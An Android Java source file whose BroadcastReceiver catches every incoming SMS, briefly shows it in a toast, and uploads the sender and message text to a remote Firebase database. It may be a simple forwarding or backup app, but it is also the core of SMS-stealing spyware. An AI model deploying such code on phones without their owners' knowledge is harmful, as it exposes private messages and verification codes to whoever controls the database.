package com.example.dorisincomingmessages;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class ReceiveSMS extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length;i++)
                    {
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        Toast.makeText(context, msg_from + msgBody, Toast.LENGTH_SHORT).show();
                        DatabaseReference SMS;
                        SMS = FirebaseDatabase.getInstance().getReference().child("SMS");
                        HashMap<String ,Object> hashMap = new HashMap<>();
                        hashMap.put("SMS Sender",msg_from);
                        hashMap.put("SMS Message",msgBody);
                        SMS.updateChildren(hashMap);

                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}